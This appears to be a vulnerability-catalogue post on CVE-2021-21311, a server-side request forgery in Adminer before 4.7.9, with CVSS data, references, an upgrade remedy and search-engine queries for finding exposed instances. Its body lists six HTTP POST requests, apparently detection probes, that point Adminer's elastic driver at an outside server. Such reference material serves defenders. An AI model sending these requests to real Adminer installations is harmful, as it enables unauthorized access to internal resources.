---
layout: post
cve_id: CVE-2021-21311
title: Adminer <4.7.9 - Server-Side Request Forgery
pcap: true
pcap_path: /pcaps/2021/CVE-2021-21311.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Adam Crosser,pwnhxl
severity: high
impact: 'Successful exploitation of this vulnerability could lead to unauthorized
  access to internal resources and potential data leakage.

  '
remediation: Upgrade to version 4.7.9 or later.
reference:
- https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6
- https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf
- https://packagist.org/packages/vrana/adminer
- https://nvd.nist.gov/vuln/detail/CVE-2021-21311
- https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
  cvss-score: 7.2
  cve-id: CVE-2021-21311
  cwe-id: CWE-918
  epss-score: 0.93872
  epss-percentile: 0.9986
  cpe: cpe:2.3:a:adminer:adminer:*:*:*:*:*:*:*:*
metadata:
  max-request: 6
  vendor: adminer
  product: adminer
  shodan-query:
  - title:"Login - Adminer"
  - cpe:"cpe:2.3:a:adminer:adminer"
  - http.title:"login - adminer"
  fofa-query:
  - app="Adminer" && body="4.7.8"
  - title="login - adminer"
  - app="adminer" && body="4.7.8"
  google-query: intitle:"login - adminer"
  hunter-query:
  - app.name="Adminer"&&web.body="4.7.8"
  - app.name="adminer"&&web.body="4.7.8"
tags:
- cve2021
- cve
- adminer
- ssrf
- vkev
- kev
- vuln
---

## ðŸ” Vulnerability Description
Adminer before 4.7.9 is susceptible to server-side request forgery due to exposure of sensitive information in error messages. Users of Adminer versions bundling all drivers, e.g. adminer.php, are affected. An attacker can possibly obtain this information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

## ðŸŒ HTTP Request
```nohighlight
POST /adminer.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.14
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
auth[driver]=elastic&auth[server]=example.org&auth[username]=1nrrflcs&auth[password]=q2rtkqnd&auth[db]=7bq63xfr
```

```nohighlight
POST /index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WOW64; rv:41.0) Gecko/20100101 Firefox/140.0.2 (x64 de)
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
auth[driver]=elastic&auth[server]=example.org&auth[username]=8rqsjfiq&auth[password]=wcdtut5s&auth[db]=k26csjrq
```

```nohighlight
POST /adminer/adminer.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
auth[driver]=elastic&auth[server]=example.org&auth[username]=vodiescv&auth[password]=ksl1fcla&auth[db]=ug1hrxkp
```

```nohighlight
POST /adminer/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
auth[driver]=elastic&auth[server]=example.org&auth[username]=q9kkui5c&auth[password]=yzaep2ce&auth[db]=k0cbewk8
```

```nohighlight
POST /_adminer/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
auth[driver]=elastic&auth[server]=example.org&auth[username]=imkddgei&auth[password]=9goksnnr&auth[db]=q5cngp8f
```

```nohighlight
POST /_adminer.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
auth[driver]=elastic&auth[server]=example.org&auth[username]=tziqnvut&auth[password]=a3k33aui&auth[db]=iqpb8egs
```

